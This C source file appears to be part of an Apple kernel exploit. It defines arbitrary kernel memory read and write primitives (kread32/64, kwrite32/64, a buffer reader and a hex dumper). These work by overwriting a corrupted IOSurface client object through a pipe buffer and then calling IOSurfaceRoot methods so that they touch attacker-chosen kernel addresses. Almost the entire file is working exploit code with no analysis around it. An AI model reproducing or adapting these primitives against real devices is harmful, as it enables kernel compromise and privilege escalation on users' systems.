#include "IOSurfaceRoot.h"

extern void printLog(const char *format, ...);
#define printf(...) printLog(__VA_ARGS__)

extern uint32_t kernel_page_size;

static io_connect_t _uc;
static uint32_t _surf_id;
static int _read_pipe;
static int _write_pipe;

int kernel_rw_init(io_connect_t uc, uint32_t surf_id, int read_pipe, int write_pipe)
{
    _uc = uc;
    _surf_id = surf_id;
    _read_pipe = read_pipe;
    _write_pipe = write_pipe;
    
    return 0;
}

uint32_t kread32(uint64_t kaddr)
{
    uint8_t buf[kernel_page_size];
    
    read(_read_pipe, buf, kernel_page_size-1);
    
    // *(uint64_t *)(buf + 0x10 + 0x40) = _mapped_address + 0x10; // IOSurfaceClient->IOSurface
    *(uint64_t *)(buf + 0x10 + 0xC0) = kaddr - 0x14;
    
    write(_write_pipe, buf, kernel_page_size-1);
    
    return IOSurfaceRoot_get_surface_use_count(_uc, _surf_id);
}

uint64_t kread64(uint64_t kaddr)
{
    uint8_t b[8];
    
    *(uint32_t *)b = kread32(kaddr);
    *(uint32_t *)(b + 4) = kread32(kaddr + 4);
    
    return *(uint64_t *)b;
}

void kwrite32(uint64_t kaddr, uint32_t val)
{
    uint8_t buf[kernel_page_size];
    
    read(_read_pipe, buf, kernel_page_size-1);
    
    // *(uint64_t *)(buf + 0x10 + 0x40) = _mapped_address + 0x10; // IOSurfaceClient->IOSurface
    *(uint64_t *)(buf + 0x10 + 0xB0) = 1; // See IOSurface::setCompressedTileDataRegionMemoryUsedOfPlane
    *(uint64_t *)(buf + 0x10 + 0xC0) = kaddr - 0x98; // Write destination (+0x98 added)
    
    write(_write_pipe, buf, kernel_page_size-1);
    
    IOSurfaceRoot_set_compressed_tile_data_region_memory_used_of_plane(_uc, _surf_id, val);
}

void kwrite64(uint64_t kaddr, uint64_t val)
{
    uint8_t buf[kernel_page_size];
    
    read(_read_pipe, buf, kernel_page_size-1);
    
    // *(uint64_t *)(buf + 0x10 + 0x40) = _mapped_address + 0x10; // IOSurfaceClient->IOSurface
    *(uint64_t *)(buf + 0x10 + 0x360) = kaddr; // See IOSurface::setIndexedTimestamp
    
    write(_write_pipe, buf, kernel_page_size-1);
    
    IOSurfaceRoot_set_indexed_timestamp(_uc, _surf_id, val);
}

uint8_t kread8(uint64_t addr) {
    uint32_t low = kread32(addr);
    return (uint8_t)(low & 0xFF);
}

void kreadbuf(uint64_t addr, void *buf, uint64_t len) {
    uint8_t *out = (uint8_t *)buf;
    for (uint64_t i = 0; i < len; i++) {
        out[i] = kread8(addr + i);
    }
}

void khexdump(uint64_t addr, size_t size) {
    void *data = malloc(size);
    kreadbuf(addr, data, size);
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        if ((i % 16) == 0)
        {
            printf("[0x%016llx+0x%03zx] ", addr, i);
//            printf("[0x%016llx] ", i + addr);
        }
        
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
    free(data);
}
